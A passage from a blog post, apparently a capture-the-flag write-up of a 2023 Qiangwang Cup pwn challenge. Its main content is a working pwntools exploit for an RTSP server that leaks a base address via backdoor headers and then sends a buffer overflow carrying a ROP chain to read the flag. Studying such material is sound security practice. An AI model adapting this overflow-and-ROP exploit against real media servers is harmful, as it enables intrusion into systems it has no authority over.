+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/describe.png" class title="describe"></li>
+</ul>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.111.143&#x27;</span>,<span class="number">8554</span>)</span><br><span class="line">shellcode=<span class="string">b&#x27;SETUP rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;CSeq: 1\r\n\r\n&#x27;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Session: &#x27;</span>)</span><br><span class="line">session=p.recvuntil(<span class="string">b&#x27;;&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;Session: &#x27;</span>+session+<span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;CSeq: 1\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;GET_INFO: 2023\r\n\r\n&#x27;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;100 maybe you need this 0x&#x27;</span>)</span><br><span class="line">codebase=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x2A9990</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;SET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;Session: &#x27;</span>+session+<span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;CSeq: 1\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;DESCRIBE_FLAG: qwb\r\n\r\n&#x27;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">rdi=codebase+<span class="number">0x7b133</span></span><br><span class="line">rsi=codebase+<span class="number">0x99fb0</span></span><br><span class="line">rdx=codebase+<span class="number">0x19eaa</span></span><br><span class="line">rax=codebase+<span class="number">0x35e4a</span></span><br><span class="line">flag=codebase+<span class="number">0x7B3E5</span></span><br><span class="line">read=codebase+<span class="number">0x18200</span></span><br><span class="line">syscall=codebase+<span class="number">0x19EAC</span></span><br><span class="line">gift=codebase+<span class="number">0x2a9990</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;DESCRIBE rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;Session: &#x27;</span>+session+<span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;CSeq: 1\r\n&#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;vul_string: &#x27;</span></span><br><span class="line">shellcode+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">396</span>+p32(<span class="number">0x198</span>)+p32(<span class="number">0x1f4</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">shellcode+=p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">shellcode+=p64(rdi)+p64(<span class="number">7</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="number">0x50</span>)+p64(read)</span><br><span class="line">shellcode+=p64(rdi)+p64(<span class="number">5</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="number">0x50</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">b&#x27;\r\n\r\n&#x27;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/" rel="prev" title="有即是无，无即是有">
+      <i class="fa fa-chevron-left"></i> 有即是无，无即是有
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#wtoa"><span class="nav-number">1.</span> <span class="nav-text">wtoa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91-amp-%E8%B0%83%E8%AF%95"><span class="nav-number">1.1.</span> <span class="nav-text">逆向 &amp; 调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rtsp"><span class="nav-number">2.</span> <span class="nav-text">rtsp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5"><span class="nav-number">2.1.</span> <span class="nav-text">基本情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E5%90%8E%E9%97%A8"><span class="nav-number">2.2.</span> <span class="nav-text">各种后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.3.</span> <span class="nav-text">调试过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
